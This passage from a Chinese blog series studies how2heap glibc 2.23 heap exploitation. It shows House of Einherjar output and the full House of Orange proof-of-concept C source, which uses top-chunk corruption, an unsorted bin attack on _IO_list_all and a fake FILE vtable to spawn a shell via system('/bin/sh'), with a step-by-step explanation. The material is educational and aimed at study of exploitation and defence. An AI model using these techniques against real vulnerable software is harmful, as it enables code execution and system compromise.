<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/28.png"></p>
<p>释放申请，就可以申请到fake_chunk这里了</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/27.png"></p>
<p>这个攻击手法需要注意的地方</p>
<blockquote>
<ul>
<li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li>
<li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li>
<li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li>
</ul>
</blockquote>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Welcome to House of Einherjar!</span><br><span class="line">Tested in Ubuntu 16.04 64bit.</span><br><span class="line">This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.</span><br><span class="line"></span><br><span class="line">We allocate 0x38 bytes for 'a'</span><br><span class="line">a: 0x55555555b010</span><br><span class="line">Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38</span><br><span class="line"></span><br><span class="line">We create a fake chunk wherever we want, in this case we'll create the chunk on the stack</span><br><span class="line">However, you can also create the chunk in the heap or the bss, as long as you know its address</span><br><span class="line">We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks</span><br><span class="line">(although we could do the unsafe unlink technique here in some scenarios)</span><br><span class="line">Our fake chunk at 0x7fffffffdcd0 looks like:</span><br><span class="line">prev_size (not used): 0x100</span><br><span class="line">size: 0x100</span><br><span class="line">fwd: 0x7fffffffdcd0</span><br><span class="line">bck: 0x7fffffffdcd0</span><br><span class="line">fwd_nextsize: 0x7fffffffdcd0</span><br><span class="line">bck_nextsize: 0x7fffffffdcd0</span><br><span class="line"></span><br><span class="line">We allocate 0xf8 bytes for 'b'.</span><br><span class="line">b: 0x55555555b050</span><br><span class="line"></span><br><span class="line">b.size: 0x101</span><br><span class="line">b.size is: (0x100) | prev_inuse = 0x101</span><br><span class="line">We overflow 'a' with a single null byte into the metadata of 'b'</span><br><span class="line">b.size: 0x100</span><br><span class="line">This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit</span><br><span class="line">If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk</span><br><span class="line"></span><br><span class="line">We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk</span><br><span class="line">Our fake prev_size will be 0x55555555b040 - 0x7fffffffdcd0 = 0xffffd5555555d370</span><br><span class="line"></span><br><span class="line">Modify fake chunk's size to reflect b's new prev_size</span><br><span class="line">Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set</span><br><span class="line">Our fake chunk size is now 0xffffd5555557e331 (b.size + fake_prev_size)</span><br><span class="line"></span><br><span class="line">Now we can call malloc() and it will begin in our fake chunk</span><br><span class="line">Next malloc(0x200) is at 0x7fffffffdce0</span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-orange-top-chunk-FSOP"><a href="#house-of-orange-top-chunk-FSOP" class="headerlink" title="house_of_orange(top chunk + FSOP)"></a>house_of_orange(top chunk + FSOP)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span></span><br><span class="line"><span class="comment">  It requires a leak of the heap and the libc</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   This function is just present to emulate the scenario where</span></span><br><span class="line"><span class="comment">   the address of the function system is known.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span> <span class="params">( <span class="type">char</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span></span><br><span class="line"><span class="comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span></span><br><span class="line"><span class="comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span></span><br><span class="line"><span class="comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span></span><br><span class="line"><span class="comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span></span><br><span class="line"><span class="comment">      there are two possibilities:</span></span><br><span class="line"><span class="comment">       1) Extend the Top chunk</span></span><br><span class="line"><span class="comment">       2) Mmap a new page</span></span><br><span class="line"><span class="comment">      If the size requested is smaller than 0x21000, then the former is followed.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The attack vector of this technique was removed by changing the behavior of malloc_printerr, "</span></span><br><span class="line">        <span class="string">"which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n"</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"</span></span><br><span class="line">        <span class="string">"https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we've allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what's left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk's prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What's left is 0x20c01</span></span><br><span class="line"><span class="comment">       Now, let's satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk's prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="type">size_t</span> *) ( (<span class="type">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">      that gets mmapped. It will be placed after the old heap's end</span></span><br><span class="line"><span class="comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">      top chunk so we could overwrite the chunk's size.</span></span><br><span class="line"><span class="comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">      of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">      There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">          libc's main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">      is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so</span></span><br><span class="line"><span class="comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').</span></span><br><span class="line"><span class="comment">      More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">      currently point to the libc's main_arena.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">      which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment">      When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">      in libc's main_arena.</span></span><br><span class="line"><span class="comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">      case.</span></span><br><span class="line"><span class="comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">"/bin/sh\x00"</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">      in _IO_list_all.</span></span><br><span class="line"><span class="comment">      Since we can only overwrite this address with main_arena's unsorted-bin-list,</span></span><br><span class="line"><span class="comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">      The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">      This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">      sizes between 90 and 98. For further information about the libc's bin organisation</span></span><br><span class="line"><span class="comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment">      Since we overflow the old top chunk, we also control it's size field.</span></span><br><span class="line"><span class="comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">      in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">      therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">      eventually representing the fake file pointer's fd-ptr.</span></span><br><span class="line"><span class="comment">      In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">      so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">      to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">      that the size is smaller than MINSIZE "size &lt;= 2 * SIZE_SZ"</span></span><br><span class="line"><span class="comment">      and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">      Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc's error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you'll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">{ </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>当程序没有释放函数并且可以改top_chunk的时候可以尝试使用此攻击手法，上面的程序只有在2.23下才可以利用成功，因为在2.24中就对vtable加入了检测。</p>
<p>首先创建了一个堆块，然后将top_chunk给改掉，注意这里需要4kb对齐。<code>0x55555555b400 + 0xc00 = 0x55555555c000</code></p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/29.png"></p>
<p>创建一个比top_chunk size大的数，此时top_chunk会进入unsortedbin里，然后执行 sbrk 重新分配</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/30.png"></p>
<p>拿到<code>_IO_list_all</code>的地址，将top_chunk的bk给改成<code>_IO_list_all - 0x10</code>，待会进行 unsortedbin attack，把 _IO_list_all 改为 unsortedbin 的地址</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/31.png"></p>
<p>接下来都是为FSOP做准备。修改了top_chunk的size为0x61，试想一下此时的top_chunk是unsortedbin，假如改成了0x61是不是不符合unsortedbin申请规则，会将0x61这个chunk放入small bin中或者large bin中，很显然0x61会放入到small bin中(smallbin[0x61])</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/32.png"></p>
<p>0x61很特殊，它与 unsortedbin 的偏移，跟 <code>_chain</code> 与<code> io_list_all</code> 的偏移一样，然后就是过2.23下的检测</p>
<blockquote>
<ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
</blockquote>
<p>将jump_table中的<code>_IO_OVERFLOW </code>改为 system 函数的地址，最后把vatble改成jump_table</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/33.png"></p>
<p>忘记说一个东西了就是bin_sh也就是放在了头，FSOP的时候会将第一个东西作为一参</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/34.png"></p>
